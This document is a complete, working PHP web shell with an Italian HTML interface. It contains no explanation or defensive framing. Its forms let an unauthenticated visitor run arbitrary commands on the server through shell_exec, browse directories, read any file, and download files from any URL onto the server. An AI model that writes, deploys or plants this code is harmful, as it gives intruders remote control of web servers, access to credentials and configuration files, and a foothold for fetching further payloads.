<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="UTF-8">
    <title>PHP Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2e2e2e;
            color: #ffffff;
        }

        .container {
            width: 80%;
            margin: 0 auto;
            padding-top: 20px;
        }

        .output {
            background-color: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
        }

        input[type="text"],
        button {
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
        }

        button {
            background-color: #4CAF50;
            color: #ffffff;
            border: none;
        }

        button:hover {
            background-color: #45a049;
            cursor: pointer;
        }

        .ascii-art {
            color: #ff6666;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>PHP Web Shell</h1>

        <!-- Form per inviare comandi -->
        <form method="post">
            <label for="command">Inserisci un comando da eseguire:</label><br>
            <input type="text" name="command" id="command" style="width: 80%;" required>
            <button type="submit">Esegui</button>
        </form>

        <!-- Form per navigare il filesystem -->
        <form method="post" style="margin-top: 20px;">
            <label for="directory">Naviga nel filesystem:</label><br>
            <input type="text" name="directory" id="directory" placeholder="/path/directory" style="width: 80%;" required>
            <button type="submit" name="nav">Vai</button>
        </form>

        <!-- Form per visualizzare un file -->
        <form method="post" style="margin-top: 20px;">
            <label for="file">Visualizza il contenuto di un file:</label><br>
            <input type="text" name="file" id="file" placeholder="/path/to/file" style="width: 80%;" required>
            <button type="submit" name="view">Visualizza</button>
        </form>

        <!-- Form per scaricare un file -->
        <form method="post" style="margin-top: 20px;">
            <label for="download_url">Scarica un file:</label><br>
            <input type="text" name="download_url" id="download_url" placeholder="http://example.com/file.zip" style="width: 80%;" required>
            <button type="submit" name="download">Scarica</button>
        </form>

        <!-- Output -->
        <div class="output">
            <h3>Output:</h3>
            <div>
                <?php
                // Funzione per eseguire comandi
                if (isset($_POST['command'])) {
                    $cmd = escapeshellcmd($_POST['command']);
                    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
                }

                // Funzione per visualizzare il contenuto di una directory
                if (isset($_POST['directory'])) {
                    $dir = escapeshellcmd($_POST['directory']);
                    if (is_dir($dir)) {
                        $files = scandir($dir);
                        echo "<pre>";
                        foreach ($files as $file) {
                            echo $file . "\n";
                        }
                        echo "</pre>";
                    } else {
                        echo "<pre>Directory non trovata.</pre>";
                    }
                }

                // Funzione per visualizzare il contenuto di un file
                if (isset($_POST['file'])) {
                    $file = escapeshellcmd($_POST['file']);
                    if (is_file($file)) {
                        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
                    } else {
                        echo "<pre>File non trovato.</pre>";
                    }
                }

                // Funzione per scaricare un file
                if (isset($_POST['download'])) {
                    $url = filter_var($_POST['download_url'], FILTER_SANITIZE_URL);
                    $file_name = basename($url);
                    if (filter_var($url, FILTER_VALIDATE_URL)) {
                        // Scarica il file
                        $content = file_get_contents($url);
                        if ($content !== false) {
                            file_put_contents($file_name, $content);
                            echo "<pre>File scaricato: $file_name</pre>";
                        } else {
                            echo "<pre>Errore nel download del file.</pre>";
                        }
                    } else {
                        echo "<pre>URL non valido.</pre>";
                    }
                }
                ?>
            </div>
        </div>
    </div>
</body>

</html>